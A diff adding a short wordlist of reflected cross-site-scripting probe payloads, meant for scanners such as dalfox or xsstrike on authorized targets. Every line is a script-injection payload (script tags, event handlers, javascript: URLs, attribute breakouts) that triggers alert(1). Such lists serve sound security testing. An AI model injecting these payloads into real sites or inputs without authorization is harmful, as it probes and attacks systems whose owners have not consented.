@@ -1,0 +1,18 @@
+# xss/basic — minimal reflected-XSS probes
+# Each line is one payload. Operators should run via dalfox/xsstrike on
+# authorized targets only.
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+<a href=javascript:alert(1)>x</a>
+"onmouseover=alert(1) x="
+'-alert(1)-'
+javascript:alert(1)
